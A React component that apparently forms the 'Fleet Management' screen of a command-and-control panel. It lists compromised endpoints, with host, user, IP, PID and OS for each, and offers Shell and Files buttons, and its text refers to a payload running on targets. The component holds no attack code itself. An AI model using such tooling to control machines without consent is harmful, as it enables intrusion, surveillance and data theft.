import { Monitor, RefreshCw } from 'lucide-react';
import type { Client } from '../types';

interface EndpointsProps {
  clients: Client[];
  selectedClientId: string;
  setSelectedClientId: (id: string) => void;
  setActiveTab: (tab: 'dashboard' | 'endpoints' | 'terminal' | 'files' | 'processes' | 'apps' | 'clipboard' | 'database' | 'settings') => void;
  onRefreshClients: () => void;
}

export default function Endpoints({
  clients, selectedClientId, setSelectedClientId, setActiveTab, onRefreshClients
}: EndpointsProps) {
  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between">
        <div>
          <h2 className="text-sm font-bold text-white uppercase tracking-wider">Fleet Management</h2>
          <p className="text-[11px] text-slate-400">Select an active machine to target commands & explore filesystem</p>
        </div>
        <button
          onClick={onRefreshClients}
          className="px-2.5 py-1 bg-c2pill border border-c2border hover:border-c2accent text-xs font-medium text-slate-300 hover:text-white rounded-md flex items-center space-x-1.5 transition-colors"
        >
          <RefreshCw className="w-3 h-3" />
          <span>Refresh Fleet</span>
        </button>
      </div>

      <div className="bg-c2card border border-c2border rounded-xl shadow-card overflow-hidden">
        {clients.length === 0 ? (
          <div className="p-12 text-center flex flex-col items-center justify-center space-y-3">
            <Monitor className="w-10 h-10 text-slate-600" />
            <h3 className="text-sm font-bold text-slate-200">No active endpoints connected</h3>
            <p className="text-xs text-slate-500">Endpoints will appear here automatically when the payload runs on target.</p>
          </div>
        ) : (
          <table className="w-full text-left border-collapse">
            <thead>
              <tr className="border-b border-c2border bg-slate-900/60 text-[10px] uppercase font-bold text-slate-400 tracking-wider">
                <th className="p-3.5">Endpoint Host / User</th>
                <th className="p-3.5">IP Address</th>
                <th className="p-3.5">PID</th>
                <th className="p-3.5">Operating System</th>
                <th className="p-3.5">Status</th>
                <th className="p-3.5 text-right">Actions</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-c2border text-xs">
              {clients.map((c, i) => {
                const isTarget = selectedClientId ? selectedClientId === c.id : i === 0;
                return (
                  <tr
                    key={c.id}
                    onClick={() => setSelectedClientId(c.id)}
                    className={`transition-colors cursor-pointer ${isTarget ? 'bg-[#1A2235]' : 'hover:bg-c2pill/50'}`}
                  >
                    <td className="p-3.5">
                      <div className="flex items-center space-x-2.5">
                        <div className={`p-1.5 rounded-md border ${isTarget ? 'bg-c2accent text-white border-c2accent' : 'bg-c2bg text-slate-400 border-c2border'}`}>
                          <Monitor className="w-3.5 h-3.5" />
                        </div>
                        <div>
                          <div className="flex items-center space-x-2">
                            <span className="font-bold text-white text-xs">{c.host}</span>
                            <span className="text-[11px] text-slate-400">({c.user})</span>
                            {isTarget && (
                              <span className="px-1.5 py-0.2 rounded text-[9px] font-bold bg-c2accent text-white">TARGET</span>
                            )}
                          </div>
                          <div className="text-[10px] text-slate-500 font-mono">ID: {c.id}</div>
                        </div>
                      </div>
                    </td>
                    <td className="p-3.5 font-mono text-slate-200 font-medium">{c.ip}</td>
                    <td className="p-3.5 font-mono text-slate-400">{c.pid}</td>
                    <td className="p-3.5 text-slate-300 font-mono text-[11px]">{c.os}</td>
                    <td className="p-3.5">
                      <span className="px-2 py-0.5 bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-[10px] font-semibold rounded">
                        {c.status || 'ONLINE'}
                      </span>
                    </td>
                    <td className="p-3.5 text-right">
                      <div className="flex items-center justify-end space-x-1.5">
                        <button
                          onClick={(e) => { e.stopPropagation(); setSelectedClientId(c.id); setActiveTab('terminal'); }}
                          className="px-2.5 py-1 bg-c2bg hover:bg-c2pill border border-c2border hover:border-c2borderlight text-xs font-medium text-c2cyan rounded-md transition-colors"
                        >
                          Shell
                        </button>
                        <button
                          onClick={(e) => { e.stopPropagation(); setSelectedClientId(c.id); setActiveTab('files'); }}
                          className="px-2.5 py-1 bg-c2bg hover:bg-c2pill border border-c2border hover:border-c2borderlight text-xs font-medium text-amber-400 rounded-md transition-colors"
                        >
                          Files
                        </button>
                      </div>
                    </td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        )}
      </div>
    </div>
  );
}
